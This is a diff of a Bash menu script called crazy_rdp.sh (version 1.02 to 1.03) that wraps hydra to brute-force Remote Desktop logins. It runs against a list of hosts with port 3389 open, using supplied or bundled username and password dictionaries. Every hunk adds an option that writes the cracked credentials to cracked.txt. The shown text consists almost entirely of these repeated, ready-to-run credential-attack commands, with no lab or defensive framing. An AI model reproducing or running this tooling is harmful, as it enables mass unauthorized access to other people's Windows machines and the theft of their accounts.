@@ -8,7 +8,7 @@ cat << EOF
         +-------------------------------------+
         |            Auto  Script             |
         |       by Mehran @mehranexpert       | 
-        |            Version 1.02             |
+        |            Version 1.03             |
         +-------------------------------------+
 
 EOF
@@ -46,7 +46,7 @@ read -p "   Menu selection : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Enter login {administrator, admin & etc.} : " loginbrute
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -56,7 +56,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -66,7 +66,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -75,7 +75,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -110,7 +110,7 @@ read -p "   Menu selection : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Enter login {administrator, admin & etc.} : " loginbrute
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -120,7 +120,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -130,7 +130,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -139,7 +139,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -167,7 +167,7 @@ read -p "   Menu selection : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Enter login {administrator, admin & etc.} : " loginbrute
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -177,7 +177,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -187,7 +187,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -196,7 +196,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -445,7 +445,7 @@ read -p "   Menu selection : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Enter login {administrator, admin & etc.} : " loginbrute
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -455,7 +455,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -465,7 +465,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -474,7 +474,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -517,7 +517,7 @@ read -p "   Menu selection : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Enter login {administrator, admin & etc.} : " loginbrute
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -527,7 +527,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -537,7 +537,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -546,7 +546,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -590,7 +590,7 @@ read -p "   Menu selection : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Enter login {administrator, admin & etc.} : " loginbrute
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -600,7 +600,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -610,7 +610,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -619,7 +619,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -663,7 +663,7 @@ read -p "   Menu selection : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Enter login {administrator, admin & etc.} : " loginbrute
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -673,7 +673,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -683,7 +683,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -692,7 +692,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -734,7 +734,7 @@ read -p "   Menu selection : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Enter login {administrator, admin & etc.} : " loginbrute
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -744,7 +744,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -754,7 +754,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -763,7 +763,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -806,7 +806,7 @@ read -p "   Menu selection : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Enter login {administrator, admin & etc.} : " loginbrute
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -816,7 +816,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -826,7 +826,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -835,7 +835,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -877,7 +877,7 @@ read -p "   Menu selection : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Enter login {administrator, admin & etc.} : " loginbrute
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -887,7 +887,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -897,7 +897,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -906,7 +906,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -947,7 +947,7 @@ read -p "   Menu selection : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Enter login {administrator, admin & etc.} : " loginbrute
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -957,7 +957,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -967,7 +967,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -976,7 +976,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -1018,7 +1018,7 @@ read -p "   Menu selection : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Enter login {administrator, admin & etc.} : " loginbrute
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -1028,7 +1028,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -1038,7 +1038,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -1047,7 +1047,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -1090,7 +1090,7 @@ read -p "   Menu selection : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Enter login {administrator, admin & etc.} : " loginbrute
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -1100,7 +1100,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -1110,7 +1110,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -1119,7 +1119,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -1162,7 +1162,7 @@ read -p "   Menu selection : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Enter login {administrator, admin & etc.} : " loginbrute
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -1172,7 +1172,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -1182,7 +1182,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -1191,7 +1191,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -1234,7 +1234,7 @@ read -p "   Menu selection : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Enter login {administrator, admin & etc.} : " loginbrute
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -1244,7 +1244,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -1254,7 +1254,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -1263,7 +1263,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -1307,7 +1307,7 @@ read -p "   Menu selection : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Enter login {administrator, admin & etc.} : " loginbrute
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -1317,7 +1317,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -1327,7 +1327,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
